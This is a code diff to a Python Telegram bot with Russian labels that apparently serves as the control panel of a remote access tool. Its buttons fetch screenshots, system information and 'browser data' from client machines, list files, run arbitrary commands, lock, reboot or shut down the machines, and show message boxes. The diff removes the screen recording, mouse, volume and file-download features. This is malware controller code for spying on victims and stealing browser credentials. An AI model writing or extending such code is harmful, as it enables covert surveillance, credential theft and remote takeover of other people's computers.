@@ -142,22 +142,15 @@ async def handle_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         keyboard = [
             [InlineKeyboardButton("🖥 Скриншот", callback_data="screenshot"),
-             InlineKeyboardButton("📹 Запись экрана (10 сек)", callback_data="record")],
-            [InlineKeyboardButton("🔍 Системная информация", callback_data="system_info"),
-             InlineKeyboardButton("🔑 Данные браузеров", callback_data="browser_data")],
+             InlineKeyboardButton("🔍 Системная информация", callback_data="system_info")],
+            [InlineKeyboardButton("🔑 Данные браузеров", callback_data="browser_data"),
+             InlineKeyboardButton("📂 Список файлов", callback_data="list_files")],
             [InlineKeyboardButton("🔒 Блокировка", callback_data="lock"),
-             InlineKeyboardButton("🖱 Клик мышью", callback_data="mouse_click")],
-            [InlineKeyboardButton("❌ Alt+F4", callback_data="altf4"),
-             InlineKeyboardButton("🔊 Громкость +", callback_data="volume_up")],
-            [InlineKeyboardButton("🔁 Перезагрузка", callback_data="reboot"),
-             InlineKeyboardButton("🔈 Громкость -", callback_data="volume_down")],
+             InlineKeyboardButton("🔁 Перезагрузка", callback_data="reboot")],
             [InlineKeyboardButton("⭕ Выключить", callback_data="shutdown"),
-             InlineKeyboardButton("🔇 Выключить звук", callback_data="mute")],
-            [InlineKeyboardButton("📂 Список файлов", callback_data="list_files"),
              InlineKeyboardButton("⌨️ Выполнить команду", callback_data="run_command")],
             [InlineKeyboardButton("💬 Отправить сообщение", callback_data="message_box"),
-             InlineKeyboardButton("📥 Скачать файл", callback_data="download_file")],
-            [InlineKeyboardButton("🔙 Назад", callback_data="back")]
+             InlineKeyboardButton("🔙 Назад", callback_data="back")]
         ]
         
         await query.edit_message_text(
@@ -207,13 +200,6 @@ async def handle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     photo=response.content,
                     caption=f"🖥 Скриншот с {CLIENTS[client_id]['name']}"
                 )
-            elif command == "record":
-                await context.bot.send_video(
-                    chat_id=query.message.chat_id,
-                    video=response.content,
-                    caption=f"🎬 Видеозапись с {CLIENTS[client_id]['name']}",
-                    supports_streaming=True
-                )
             elif command == "browser_data":
                 data = response.json()
                 # Формируем краткий отчет
@@ -239,7 +225,7 @@ async def handle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     f"ОС: {data.get('system', '')} {data.get('release', '')}\n"
                     f"Процессор: {data.get('processor', '')}\n"
                     f"Память: {data.get('memory', {}).get('total', 0) // (1024**3)} GB\n"
-                    f"Пользователи: {', '.join([u['name'] for u in data.get('users', [])])}"
+                    f"Пользователи: {', '.join(data.get('users', []))}"
                 )
                 
                 # Отправляем полные данные файлом
